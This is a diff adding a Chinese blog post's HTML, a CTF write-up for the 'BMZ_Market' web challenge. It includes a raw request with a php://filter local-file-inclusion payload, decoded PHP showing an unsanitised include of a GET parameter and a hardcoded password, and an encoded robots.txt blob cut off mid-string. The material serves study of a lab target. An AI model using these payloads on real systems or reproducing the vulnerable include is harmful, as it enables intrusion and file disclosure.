@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chaserw.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="综合渗透BMZ_Market打开环境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BMZCTF WP">
+<meta property="og:url" content="http://chaserw.github.io/2021/03/19/BMZCTF-WP/index.html">
+<meta property="og:site_name" content="chaser&#39;s Blog">
+<meta property="og:description" content="综合渗透BMZ_Market打开环境">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf9.png">
+<meta property="article:published_time" content="2021-03-19T06:45:25.000Z">
+<meta property="article:modified_time" content="2021-03-28T11:07:20.153Z">
+<meta property="article:author" content="chaser">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Write-Up">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf1.png">
+
+<link rel="canonical" href="http://chaserw.github.io/2021/03/19/BMZCTF-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BMZCTF WP | chaser's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <script src="/live2d-widget/autoload.js"></script>
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chaser's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chaserw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://chaserw.github.io/2021/03/19/BMZCTF-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="chaser">
+      <meta itemprop="description" content="文档工程师 摸鱼砖家">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chaser's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BMZCTF WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-19 14:45:25" itemprop="dateCreated datePublished" datetime="2021-03-19T14:45:25+08:00">2021-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-28 19:07:20" itemprop="dateModified" datetime="2021-03-28T19:07:20+08:00">2021-03-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h3><h4 id="BMZ-Market"><a href="#BMZ-Market" class="headerlink" title="BMZ_Market"></a>BMZ_Market</h4><p>打开环境</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf1.png"></p>
+<span id="more"></span>
+
+<p>查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;BMZ Market&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;bmz&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>BMZ Market<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;covers.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;masthead mb-auto&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;masthead-brand&quot;</span>&gt;</span>BMZ Market<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;nav nav-masthead justify-content-center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link active&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">&quot;main&quot;</span> <span class="attr">class</span>=<span class="string">&quot;inner cover&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;cover-heading&quot;</span>&gt;</span>Coming soon<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lead&quot;</span>&gt;</span></span><br><span class="line">          </span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lead&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-lg btn-secondary&quot;</span>&gt;</span>more<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;mastfoot mt-auto&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span>Power by<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>@kuaile<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到注释处<code>?lang=fr</code>，印象中以前在哪见过这种东西，应该是文件包含，拼接到url访问，与原页面内容没太多变化，修改为<code>lang=cn</code>，发现报错</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf2.png"></p>
+<p>查看<code>index.php</code>内容</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?lang=php://filter/convert.base64-encode/resource=index</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.bmzclub.cn:21490</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=ca99f077-3758-40ca-802a-0b8afbf5b9e7; Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1612590588,1612590698; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1612590698; PHPSESSID=r8hvjhmrvbjjcp8sbov7pmm2p0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>base64解码之后得到<code>index.php</code>内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$password &#x3D;&quot;Nevergiveup135.&quot; ;&#x2F;&#x2F;I have to remember it</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;lang&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&#39;lang&#39;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;BMZ Market&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;bmz&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;BMZ Market&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href&#x3D;&quot;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;link href&#x3D;&quot;covers.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class&#x3D;&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class&#x3D;&quot;masthead-brand&quot;&gt;BMZ Market&lt;&#x2F;h3&gt;</span><br><span class="line">          &lt;nav class&#x3D;&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;nav-link active&quot; href&#x3D;&quot;#&quot;&gt;Home&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;!-- &lt;a class&#x3D;&quot;nav-link active&quot; href&#x3D;&quot;?lang&#x3D;fr&quot;&gt;Fr&#x2F;a&gt; --&gt;</span><br><span class="line">          &lt;&#x2F;nav&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role&#x3D;&quot;main&quot; class&#x3D;&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class&#x3D;&quot;cover-heading&quot;&gt;Coming soon&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">          &lt;?php</span><br><span class="line">            if (isset($_GET[&#39;lang&#39;]))</span><br><span class="line">          &#123;</span><br><span class="line">          echo $message;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            ?&gt;</span><br><span class="line"></span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">            &lt;?php</span><br><span class="line">          &#125;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class&#x3D;&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Power by&lt;a href&#x3D;&quot;#&quot;&gt;@kuaile&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;footer&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>目录暴破得到以下内容，在admin和backup都没什么发现，也不存在对应的php文件</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf3.png"></p>
+<p>查看robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">776fz4nvvp&#x2F;vvok9IC&#x2F;vvYDvvY3CtO+8ie++iSB+4pS74pSB4pS7ICAgLy8qwrTiiIfvvYAqLyBbJ18nXTsgbz0o776f772w776fKSAgPV89MzsgYz0o776fzpjvvp8pID0o776f772w776fKS0o776f772w776fKTsgKO++n9CU776fKSA9KO++n86Y776fKT0gKG9eX15vKS8gKG9eX15vKTso776f0JTvvp8pPXvvvp&#x2F;OmO++nzogJ18nICzvvp&#x2F;Pie++n+++iSA6ICgo776fz4nvvp&#x2F;vvok9PTMpICsnXycpIFvvvp&#x2F;OmO++n10gLO++n++9sO++n+++iSA6KO++n8+J776f776JKyAnXycpW29eX15vIC0o776fzpjvvp8pXSAs776f0JTvvp&#x2F;vvok6KCjvvp&#x2F;vvbDvvp89PTMpICsnXycpW+++n++9sO++n10gfTsgKO++n9CU776fKSBb776fzpjvvp9dID0oKO++n8+J776f776JPT0zKSArJ18nKSBbY15fXm9dOyjvvp&#x2F;QlO++nykgWydjJ10gPSAoKO++n9CU776fKSsnXycpIFsgKO++n++9sO++nykrKO++n++9sO++nyktKO++n86Y776fKSBdOyjvvp&#x2F;QlO++nykgWydvJ10gPSAoKO++n9CU776fKSsnXycpIFvvvp&#x2F;OmO++n107KO++n2&#x2F;vvp8pPSjvvp&#x2F;QlO++nykgWydjJ10rKO++n9CU776fKSBbJ28nXSso776fz4nvvp&#x2F;vvokgKydfJylb776fzpjvvp9dKyAoKO++n8+J776f776JPT0zKSArJ18nKSBb776f772w776fXSArICgo776f0JTvvp8pICsnXycpIFso776f772w776fKSso776f772w776fKV0rICgo776f772w776fPT0zKSArJ18nKSBb776fzpjvvp9dKygo776f772w776fPT0zKSArJ18nKSBbKO++n++9sO++nykgLSAo776fzpjvvp8pXSso776f0JTvvp8pIFsnYyddKygo776f0JTvvp8pKydfJykgWyjvvp&#x2F;vvbDvvp8pKyjvvp&#x2F;vvbDvvp8pXSsgKO++n9CU776fKSBbJ28nXSsoKO++n++9sO++nz09MykgKydfJykgW+++n86Y776fXTso776f0JTvvp8pIFsnXyddID0ob15fXm8pIFvvvp9v776fXSBb776fb+++n107KO++n861776fKT0oKO++n++9sO++nz09MykgKydfJykgW+++n86Y776fXSsgKO++n9CU776fKSAu776f0JTvvp&#x2F;vvokrKCjvvp&#x2F;QlO++nykrJ18nKSBbKO++n++9sO++nykgKyAo776f772w776fKV0rKCjvvp&#x2F;vvbDvvp89PTMpICsnXycpIFtvXl9ebyAt776fzpjvvp9dKygo776f772w776fPT0zKSArJ18nKSBb776fzpjvvp9dKyAo776fz4nvvp&#x2F;vvokgKydfJykgW+++n86Y776fXTsgKO++n++9sO++nykrPSjvvp&#x2F;OmO++nyk7ICjvvp&#x2F;QlO++nylb776fzrXvvp9dPSdcXCc7ICjvvp&#x2F;QlO++nyku776fzpjvvp&#x2F;vvok9KO++n9CU776fKyDvvp&#x2F;vvbDvvp8pW29eX15vIC0o776fzpjvvp8pXTsob+++n++9sO++n28pPSjvvp&#x2F;Pie++n+++iSArJ18nKVtjXl9eb107KO++n9CU776fKSBb776fb+++n109J1wiJzso776f0JTvvp8pIFsnXyddICggKO++n9CU776fKSBbJ18nXSAo776fzrXvvp8rKO++n9CU776fKVvvvp9v776fXSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICjvvp&#x2F;OmO++nykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo77